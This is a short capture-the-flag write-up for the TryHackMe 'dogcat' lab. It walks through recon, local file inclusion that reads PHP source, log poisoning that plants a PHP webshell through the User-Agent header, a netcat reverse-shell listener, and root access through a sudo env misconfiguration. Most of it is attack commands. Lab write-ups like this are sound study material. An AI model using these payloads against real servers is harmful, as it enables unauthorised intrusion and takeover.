# TryHackMe — dogcat Writeup
**By:** Zytoona  
**Room:** [dogcat](https://tryhackme.com/room/dogcat)  
**Difficulty:** Medium  

---

## Recon

```bash
nmap -sV -sC <TARGET_IP>
```


---

## LFI — Source Code via PHP Filter

```
http://<TARGET_IP>/?view=cat/../../../../../var/www/html/index&ext=php://filter/convert.base64-encode/resource=cat/../../../../../var/www/html/index
```


Decoded the Base64 output and found the vulnerable PHP source.

---

## Log Poisoning — RCE via User-Agent

Injected PHP webshell into Apache log using curl:

```bash
curl -H 'User-Agent: <?php system($_GET["cmd"]); ?>' http://<TARGET_IP>
```

Triggered it via LFI:

```bash
curl 'http://<TARGET_IP>/?view=cat../../../../../var/log/apache2/access.log&ext=&cmd=whoami'
```

---

## Reverse Shell

```bash
# listener
nc -lnvp 4444
```

```bash
# trigger via curl
curl 'http://<TARGET_IP>/?view=cat../../../../../var/log/apache2/access.log&ext=&cmd=<URL_ENCODED_REVSHELL>'
```

---


```
## Privilege Escalation

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/env

sudo env /bin/sh
```
